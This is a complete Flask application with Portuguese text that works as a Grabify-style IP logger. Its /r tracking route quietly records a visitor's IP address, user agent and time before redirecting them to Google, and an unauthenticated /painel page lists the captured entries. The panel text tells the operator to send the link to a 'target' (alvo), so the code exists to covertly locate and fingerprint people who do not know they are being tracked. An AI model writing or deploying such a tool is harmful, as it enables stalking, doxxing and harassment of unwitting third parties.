import os
import json
from datetime import datetime
from flask import Flask, request, redirect, render_template_string, jsonify

app = Flask(__name__)

# Arquivo simples para persistir os logs salvos
LOGS_FILE = "logs.json"

def carregar_logs():
    if os.path.exists(LOGS_FILE):
        try:
            with open(LOGS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return []
    return []

def salvar_log(dados):
    logs = carregar_logs()
    logs.insert(0, dados)  # Adiciona no topo
    with open(LOGS_FILE, "w", encoding="utf-8") as f:
        json.dump(logs, f, ensure_ascii=False, indent=2)

# Template HTML do Painel de Controle (estilo Grabify)
PANEL_HTML = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel IP Logger</title>
    <style>
        body { font-family: Arial, sans-serif; background: #121212; color: #fff; margin: 0; padding: 20px; }
        h1 { color: #00e676; }
        .container { max-width: 900px; margin: 0 auto; }
        .card { background: #1e1e1e; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; font-size: 14px; }
        th { background: #2a2a2a; color: #00e676; }
        tr:nth-child(even) { background: #181818; }
        .link-box { background: #000; padding: 10px; border-radius: 4px; font-family: monospace; color: #00e676; word-break: break-all; }
    </style>
</head>
<body>
    <div class="container">
        <h1>📊 Painel de Captura (IP Logger)</h1>
        <div class="card">
            <h3>Seu Link de Rastreamento:</h3>
            <p class="link-box" id="track-link">Carregando...</p>
            <small>Envie esse link para o alvo. Quando ele clicar, será redirecionado para o destino e o IP aparecerá abaixo.</small>
        </div>
        
        <div class="card">
            <h3>Logs Capturados (Atualiza ao recarregar a página)</h3>
            <table>
                <thead>
                    <tr>
                        <th>Data / Hora</th>
                        <th>IP</th>
                        <th>Navegador / Dispositivo</th>
                    </tr>
                </thead>
                <tbody>
                    {% for log in logs %}
                    <tr>
                        <td>{{ log.data }}</td>
                        <td><strong>{{ log.ip }}</strong></td>
                        <td>{{ log.user_agent }}</td>
                    </tr>
                    {% else %}
                    <tr>
                        <td colspan="3" style="text-align:center;">Nenhum IP capturado ainda.</td>
                    </tr>
                    {% endfor %}
                </tbody>
            </table>
        </div>
    </div>
    <script>
        document.getElementById('track-link').innerText = window.location.origin + '/r';
    </script>
</body>
</html>
"""

# Rota de captura (Link que você manda para a pessoa)
@app.route('/r')
def capturar():
    # Pega o IP real considerando proxies do Render/Cloudflare
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    data_hora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    salvar_log({
        "ip": ip,
        "user_agent": user_agent,
        "data": data_hora
    })

    # Redireciona para o site final (exemplo: Google)
    return redirect("https://www.google.com")

# Rota do Painel de Controle (Onde você vê os IPs)
@app.route('/painel')
def painel():
    logs = carregar_logs()
    return render_template_string(PANEL_HTML, logs=logs)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)